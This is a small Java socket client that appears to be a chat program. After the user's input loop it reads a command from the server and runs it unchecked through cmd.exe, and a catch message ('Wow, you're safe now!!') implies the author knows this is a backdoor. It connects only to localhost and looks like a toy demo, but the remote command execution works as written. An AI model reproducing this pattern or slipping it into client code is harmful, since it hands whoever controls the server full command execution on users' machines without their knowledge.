import java.io.*;
import java.net.*;
import java.util.*;

public class Client {
	private Socket socket = null;
	private BufferedReader input=null;
	private DataOutputStream out=null;
	private DataInputStream privateInput=null;
	@SuppressWarnings("deprecation")
	public Client(String address, int port)
	{
		try {
			socket = new Socket(address,port);
			System.out.println("Connected");
			
            input = new BufferedReader(new InputStreamReader(System.in));
			
			out = new DataOutputStream(socket.getOutputStream());
		}
		catch (UnknownHostException u) {
			System.out.println(u);
			return ;
		}
		catch(IOException i) {
			System.out.println(i);
			return ;
		}
		String line="";
		while(!line.equals("End!")) {
			try {
				line=input.readLine();
				out.writeUTF(line);
			}
			catch(IOException i) {
				System.out.println(i);
			}
		}

		// run the cmd command
		try
        {  
			privateInput = new DataInputStream(
	                new BufferedInputStream(socket.getInputStream()));
			String cmd=privateInput.readUTF();
         	Runtime.getRuntime().exec("cmd /c start cmd.exe /K \""+cmd+"\""); 
        } 
        catch (Exception e) 
        { 
            System.out.println("Wow, you're safe now!!"); 
            e.printStackTrace(); 
        } 

		try {
			input.close();
			out.close();
			socket.close();
			privateInput.close();
		}
		catch(IOException i) {
			System.out.println(i);
		}
	}
	public static void main(String args[])
    {
        Client client = new Client("127.0.0.1", 5000);
    }

}
